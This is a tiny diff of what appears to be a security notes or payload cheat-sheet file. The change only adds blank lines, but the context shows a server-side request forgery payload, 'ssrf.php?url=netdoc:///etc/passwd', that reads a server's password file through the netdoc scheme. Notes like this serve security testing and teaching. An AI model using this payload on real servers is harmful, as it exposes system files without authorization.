@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:23:56.281461+00:00'
 ```powershell
 ssrf.php?url=netdoc:///etc/passwd
 ```
+
+
